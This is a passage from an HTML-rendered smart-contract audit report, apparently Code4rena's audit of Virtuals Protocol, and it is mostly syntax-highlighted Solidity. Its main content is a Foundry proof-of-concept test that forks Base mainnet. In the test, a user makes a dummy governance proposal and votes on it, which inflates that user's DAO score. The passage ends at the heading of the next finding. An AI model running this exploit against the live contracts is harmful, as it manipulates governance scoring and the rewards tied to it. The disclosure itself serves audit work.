class=\"mtk12\"\u003enewProjectBuyTaxBasisPoints_\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint16\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewProjectSellTaxBasisPoints_\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esupport\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eDummyProposalPOC\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTest\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x1C4CcA7C5DB003824208aDDA61Bd749e55F463a3\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x98cb03B06a91e32c45F4173E290732Dc4a8F41c1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenvString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;BASE_RPC_URL\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emakeAddr\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;user\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBASE_RPC_URL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e29_225_700\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eselectFork\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforkId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_dummy_proposal_to_increase_score\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Setup proposal and propose\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edistributeTaxTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Test Proposal\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edescription\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eroll\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentDAO\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003escoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-09-functions-in-ferc20-cant-be-invoked\" style=\"position:relative;\"\u003e\u003ca href=\"#m-09-functions-in-ferc20-cant-be-invoked\" aria-label=\"m 09 functions in ferc20 cant be invoked permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-37\"\u003e[M-09] Functions in FERC20 can’t be invoked\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-428\"\u003eEPSec\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-814\"\u003eio10\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-544\"\u003eLeoGold\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-731\"\u003eoakcobalt\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca 